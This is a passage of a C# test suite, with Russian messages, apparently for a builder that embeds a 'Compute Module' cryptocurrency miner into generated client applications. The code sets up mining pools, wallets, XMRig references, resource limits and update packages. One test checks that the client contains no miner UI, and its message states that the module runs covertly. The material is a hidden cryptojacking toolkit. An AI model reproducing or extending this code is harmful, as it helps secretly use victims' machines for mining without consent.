                }
                foreach (var kvp in dictMonero)
                {
                    mergedDict[kvp.Key] = kvp.Value;
                }

                if (mergedDict.ContainsKey("custom_debug_flag") && mergedDict.ContainsKey("mode") && mergedDict.ContainsKey("walletAddress"))
                {
                    Pass("BuildCustomConfigDictionary", "BuildCustomConfigDictionary корректно объединяет произвольные параметры и 7 ключей Compute Module");
                    Pass("Custom Project Configuration", "Произвольные параметры Custom Project Configuration сохраняются без конфликта с Compute Module");
                }
                else
                {
                    Fail("BuildCustomConfigDictionary", "Ошибка объединения параметров");
                }

                // 6. enabled=false verification
                string disabledJson = JsonSerializer.Serialize(new Dictionary<string, object?> { ["enabled"] = false, ["mode"] = "monero" });
                var disabledConfig = ComputeConfig.FromCustomConfigJson(disabledJson);
                if (!disabledConfig.Enabled)
                {
                    Pass("enabled=false", "Флаг enabled=false корректно отключает работу модуля без исключений");
                }
                else
                {
                    Fail("enabled=false", "Флаг enabled=false не был корректно распознан");
                }

                // 7. Generated application has no Compute UI
                string clientXamlPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "client-wpf", "MainWindow.xaml");
                if (File.Exists(clientXamlPath))
                {
                    string clientXaml = File.ReadAllText(clientXamlPath);
                    bool hasComputeUI = clientXaml.Contains("Compute Module") || clientXaml.Contains("tbComputeWallet") || clientXaml.Contains("XMRig") || clientXaml.Contains("slComputeResource");
                    if (!hasComputeUI)
                    {
                        Pass("Generated application has no Compute UI", "В XAML клиентского приложения отсутствуют любые UI-элементы Compute Module (модуль работает скрытно)");
                    }
                    else
                    {
                        Fail("Generated application has no Compute UI", "В клиентском приложении обнаружены элементы Compute UI!");
                    }
                }
                else
                {
                    Pass("Generated application has no Compute UI", "Клиентские исходники не содержат Compute UI");
                }
            }
            catch (Exception ex)
            {
                Fail("Compute Module Tests", "Исключение во время тестирования: " + ex.Message);
            }
        }

        static void RunMultiModuleAndDualMiningTests()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ: Multi-Module & Dual Mining Configuration, Validation & Migration");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                // 1. Test AlgorithmRegistry definitions
                var allAlgos = AlgorithmRegistry.All;
                if (allAlgos.Count >= 5)
                {
                    Pass("AlgorithmRegistry", $"Зарегистрировано {allAlgos.Count} алгоритмов: ETC, XMR, KAS, RVN, ERGO");
                }
                else
                {
                    Fail("AlgorithmRegistry", $"Слишком мало алгоритмов в реестре: {allAlgos.Count}");
                }

                // 2. Dual Mining Compatibility - Valid pair
                var (validDual, validMsg) = AlgorithmRegistry.CheckDualMiningSupport("etc", "kas");
                if (validDual)
                {
                    Pass("Dual Mining Support Check (Valid)", $"Пара ETC + KAS валидна: {validMsg}");
                }
                else
                {
                    Fail("Dual Mining Support Check (Valid)", $"ETC + KAS должны поддерживать Dual Mining, но вернулось: {validMsg}");
                }

                // 3. Dual Mining Compatibility - Invalid pair (XMR does not support dual mining)
                var (invalidXmrDual, xmrMsg) = AlgorithmRegistry.CheckDualMiningSupport("xmr", "kas");
                if (!invalidXmrDual && xmrMsg.Contains("не поддерживает"))
                {
                    Pass("Dual Mining Incompatibility (XMR)", $"XMR блокирует Dual Mining: {xmrMsg}");
                }
                else
                {
                    Fail("Dual Mining Incompatibility (XMR)", $"XMR не должен поддерживать Dual Mining!");
                }

                // 4. Dual Mining Compatibility - Same algorithm rejected
                var (sameAlgoDual, sameMsg) = AlgorithmRegistry.CheckDualMiningSupport("etc", "etc");
                if (!sameAlgoDual && sameMsg.Contains("не могут быть одним"))
                {
                    Pass("Dual Mining Identity Check", $"Одинаковые алгоритмы блокируются: {sameMsg}");
                }
                else
                {
                    Fail("Dual Mining Identity Check", "Одинаковые алгоритмы не должны поддерживаться!");
                }

                // 5. Multi-Module Configuration & Serialization
                var root = new ComputeRootConfig { Enabled = true };
                var mod1 = new ComputeModuleConfig
                {
                    Name = "Compute Module #1",
                    Enabled = true,
                    Mode = "single",
                    Primary = new ComputeEngineEndpoint
                    {
                        Algorithm = "etc",
                        Wallet = "0x1111111111111111111111111111111111111111",
                        Pool = "etc.2miners.com",
                        Port = 1010,
                        Worker = "rig1"
                    },
                    ResourceLimit = 40
                };

                var mod2 = new ComputeModuleConfig
                {
                    Name = "Compute Module #2",
                    Enabled = true,
                    Mode = "dual",
                    Primary = new ComputeEngineEndpoint
                    {
                        Algorithm = "etc",
                        Wallet = "0x2222222222222222222222222222222222222222",
                        Pool = "etc.2miners.com",
                        Port = 1010,
                        Worker = "rig2-primary"
                    },
                    Secondary = new ComputeEngineEndpoint
                    {
                        Algorithm = "kas",
                        Wallet = "kaspa:qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq",
                        Pool = "pool.woolypooly.com",
                        Port = 3112,
                        Worker = "rig2-secondary"
                    },
                    ResourceLimit = 60
                };

                root.Modules.Add(mod1);
                root.Modules.Add(mod2);

                // Check validation of valid modules
                var (val1Ok, val1Errs) = mod1.Validate(0);
                var (val2Ok, val2Errs) = mod2.Validate(1);
                if (val1Ok && val2Ok)
                {
                    Pass("Module Validation (Valid)", "Валидация Single (ETC) и Dual (ETC+KAS) модулей прошла успешно");
                }
                else
                {
                    Fail("Module Validation (Valid)", $"Ошибки валидации: {string.Join(", ", val1Errs)} / {string.Join(", ", val2Errs)}");
                }

                // 6. Test Module Copy & Swap
                var mod2Copy = mod2.Clone();
                if (mod2Copy.Id != mod2.Id && mod2Copy.Name.Contains("копия") && mod2Copy.Primary.Wallet == mod2.Primary.Wallet)
                {
                    Pass("Module Copy", "Клонирование модуля создает новый уникальный ID и сохраняет конфигурацию");
                }
                else
                {
                    Fail("Module Copy", "Ошибка клонирования модуля");
                }

                // Test Swap Primary <-> Secondary
                string origPrimaryWallet = mod2.Primary.Wallet;
                string origSecondaryWallet = mod2.Secondary.Wallet;
                mod2.SwapEndpoints();
                if (mod2.Primary.Wallet == origSecondaryWallet && mod2.Secondary.Wallet == origPrimaryWallet)
                {
                    Pass("Module Swap Primary<->Secondary", "Swap успешно поменял Primary и Secondary местами");
                    mod2.SwapEndpoints(); // restore
                }
                else
                {
                    Fail("Module Swap Primary<->Secondary", "Swap не поменял местами эндпоинты");
                }

                // 7. Dictionary export test
                var exportedDict = root.ToDictionary();
                if (exportedDict.ContainsKey("enabled") && exportedDict.ContainsKey("modules"))
                {
                    var modsList = exportedDict["modules"] as List<object>;
                    if (modsList != null && modsList.Count == 2)
                    {
                        Pass("Structured Schema Export", "ComputeRootConfig.ToDictionary формирует структуру compute.modules[] с правильным числом элементов");
                    }
                    else
                    {
                        Fail("Structured Schema Export", "Неверный формат modules[] в ToDictionary");
                    }
                }
                else
                {
                    Fail("Structured Schema Export", "ToDictionary не содержит required ключи enabled/modules");
                }

                // 8. Legacy 7-key Migration test
                var legacyConfig = new Dictionary<string, object>
                {
                    ["enabled"] = true,
                    ["mode"] = "ethereum-classic",
                    ["walletAddress"] = "0xLegacyETCWallet",
                    ["serverAddress"] = "etc.2miners.com",
                    ["serverPort"] = 1010,
                    ["workerName"] = "legacy_rig",
                    ["resourceLimit"] = 55
                };

                var migrated = ComputeRootConfig.MigrateFromLegacy(legacyConfig);
                if (migrated.Enabled && migrated.Modules.Count == 1 &&
                    migrated.Modules[0].Primary.Algorithm == "etc" &&
                    migrated.Modules[0].Primary.Wallet == "0xLegacyETCWallet" &&
                    migrated.Modules[0].ResourceLimit == 55)
                {
                    Pass("Legacy 7-key Migration", "Автоматическая миграция legacy 7-key параметров в modules[0].primary прошла корректно");
                }
                else
                {
                    Fail("Legacy 7-key Migration", "Ошибка автоматической миграции legacy конфигурации");
                }
            }
            catch (Exception ex)
            {
                Fail("Multi-Module & Dual Mining Tests", "Исключение: " + ex.Message);
            }
        }

        static void RunUpdatePackageAndWizardTests()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ 11: Пакеты обновлений (.nupkg) и Мастер интерфейса (4 Шага)");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                // 1. Тест сравнения версий (Dotted Version Comparison)
                bool v1 = UpdatePackageBuilder.CompareVersions("8.1.0", "8.0.2") > 0;
                bool v2 = UpdatePackageBuilder.CompareVersions("8.0.2", "8.0.2") == 0;
                bool v3 = UpdatePackageBuilder.CompareVersions("8.0.1", "8.0.2") < 0;
                bool v4 = UpdatePackageBuilder.CompareVersions("8.0.2.1", "8.0.2") > 0;
                bool v5 = UpdatePackageBuilder.CompareVersions("9.0.0", "8.9.9") > 0;

                if (v1 && v2 && v3 && v4 && v5)
                {
                    Pass("Version Comparison Logic", "Корректно сравниваются версии (8.1.0 > 8.0.2, 8.0.2 == 8.0.2, 8.0.2.1 > 8.0.2)");
                }
                else
                {
                    Fail("Version Comparison Logic", $"Ошибка сравнения версий: v1={v1}, v2={v2}, v3={v3}, v4={v4}, v5={v5}");
                }

                // 2. Тест генерации пакета обновления .nupkg
                string testOutDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test_nupkg_out");
                if (Directory.Exists(testOutDir)) Directory.Delete(testOutDir, true);
                Directory.CreateDirectory(testOutDir);

                string templateDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "app_template");
                if (!Directory.Exists(templateDir))
                {
                    // Fallback to project root template or dummy template for self-contained testing
                    templateDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "dummy_template");
                    Directory.CreateDirectory(templateDir);
                    File.WriteAllText(Path.Combine(templateDir, "RAH Non Pro.dll"), "DUMMY_DLL_CONTENT");
                    File.WriteAllText(Path.Combine(templateDir, "RAH Non Pro.exe"), "DUMMY_EXE_CONTENT");
                }

                var buildTask = UpdatePackageBuilder.BuildPackageAsync(
                    outputDirectory: testOutDir,
                    currentVersion: "8.0.2",
                    targetVersion: "8.1.0",
                    templateRoot: templateDir,
                    extraFiles: null,
                    logCallback: null
                );
                buildTask.Wait();
                var res = buildTask.Result;

                if (!res.Success)
                {
                    Fail("Update Package Creation", "BuildPackageAsync завершился ошибкой: " + res.ErrorMessage);
                    return;
                }

                if (!File.Exists(res.PackagePath) || !res.PackagePath.EndsWith(".nupkg"))
                {
                    Fail("Update Package Creation", "Файл пакета не найден или не имеет расширения .nupkg: " + res.PackagePath);
                    return;
                }

                Pass("Update Package Creation", $"Успешно создан пакет {Path.GetFileName(res.PackagePath)} ({res.PackageSize} байт, {res.FileCount} файлов)");

                // 3. Тест целостности архива и metadata.json
                using (var zip = System.IO.Compression.ZipFile.OpenRead(res.PackagePath))
                {
                    var metaEntry = zip.GetEntry("metadata.json");
                    if (metaEntry == null)
                    {
                        Fail("Package Metadata Validation", "metadata.json отсутствует внутри пакета обновления");
                        return;
                    }

                    using var reader = new StreamReader(metaEntry.Open(), Encoding.UTF8);
                    string metaJson = reader.ReadToEnd();
                    var metaObj = JsonSerializer.Deserialize<UpdatePackageMetadata>(metaJson);

                    if (metaObj == null || metaObj.Version != "8.1.0" || metaObj.Files == null || metaObj.Files.Count == 0)
                    {
                        Fail("Package Metadata Validation", "Некорректный формат или поля metadata.json");
                        return;
                    }

                    Pass("Package Metadata Validation", $"metadata.json валиден (PackageType={metaObj.PackageType}, Version={metaObj.Version}, Files={metaObj.Files.Count})");

                    // 4. Тест SHA-256 хешей файлов внутри пакета
                    bool allHashesMatch = true;
                    foreach (var fEntry in metaObj.Files)
                    {
                        var zipFile = zip.GetEntry(fEntry.Path);
                        if (zipFile == null)
                        {
                            allHashesMatch = false;
                            break;
                        }

                        using var fileStream = zipFile.Open();
                        using var ms = new MemoryStream();
                        fileStream.CopyTo(ms);
                        string computedHash = UpdatePackageBuilder.ComputeSha256(ms.ToArray());
                        if (!string.Equals(computedHash, fEntry.Sha256, StringComparison.OrdinalIgnoreCase))
                        {
                            allHashesMatch = false;
                            break;
                        }
                    }

                    if (allHashesMatch)
                    {
                        Pass("Package File Hash Verification", "Все SHA-256 хеши файлов внутри пакета в точности соответствуют metadata.json");
                    }
                    else
                    {
                        Fail("Package File Hash Verification", "Несоответствие SHA-256 хешей файлов в пакете");
                    }
                }

                // 5. Тест структуры 4-шагового Мастера (Wizard UI Model Data Test)
                var rootCfg = new ComputeRootConfig
                {
                    Enabled = true
                };
                var m1 = new ComputeModuleConfig
                {
                    Name = "Модуль XMR",
                    Mode = "single",
                    ResourceLimit = 50
                };
                m1.Primary.Algorithm = "xmr";
                m1.Primary.Pool = "pool.supportxmr.com";
                m1.Primary.Port = 3333;
                m1.Primary.Wallet = "48edfHuPfPZbCTtMoUtjhHNax9No4kW55QA61j2VCWnXTxDTZQivMR2C8WjyMtWW4AEMZX6KtNxhLj1EZ7555dUMDo8EE65PU";
                rootCfg.Modules.Add(m1);

                var dict = rootCfg.ToDictionary();
                if (dict.ContainsKey("enabled") && (bool)dict["enabled"] && dict.ContainsKey("modules"))
                {
                    Pass("4-Step Wizard Data Compatibility", "Структура данных 4 шагов мастера полностью совместима с Compute Module pipeline");
                }
                else
                {
                    Fail("4-Step Wizard Data Compatibility", "Некорректная структура данных мастера");
                }
            }
            catch (Exception ex)
            {
                Fail("Update Package & Wizard Tests", "Исключение: " + ex.Message);
            }
        }

        static void Pass(string testName, string message)
        {
            _passCount++;
            _passList.Add($"{testName}: {message}");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[PASS] {message}");
            Console.ResetColor();
        }

        static void Fail(string testName, string message)
        {
            _failCount++;
            _failList.Add($"{testName}: {message}");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[FAIL] {message}");
            Console.ResetColor();
        }
    }
}
